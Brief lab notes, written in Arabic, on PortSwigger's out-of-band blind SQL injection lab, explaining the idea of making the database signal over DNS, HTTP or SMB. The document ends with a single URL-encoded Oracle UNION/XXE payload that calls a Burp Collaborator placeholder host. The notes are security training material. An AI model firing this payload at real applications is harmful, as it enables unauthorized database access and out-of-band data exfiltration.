# Lab: Blind SQL injection with out-of-band interaction

https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band

- الفكره من الLab ده عباره انك نبيظهرش data او error اوو تاخير او اي حاجه فا ممكن نستخدم out of band
- قناه خارجيه نستلم عليها بدل HTTP Response تخلي database server نفسه يبعتلك الاشاره في مكان تاني ذي
    1. HTTP  Response
    2. DNS Response
    3. SMB Response
    
    ---
    
    ```bash
    1. '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP - Collaborator/">+%25remote%3b]>'),'/l')+FROM+dual--
    ```
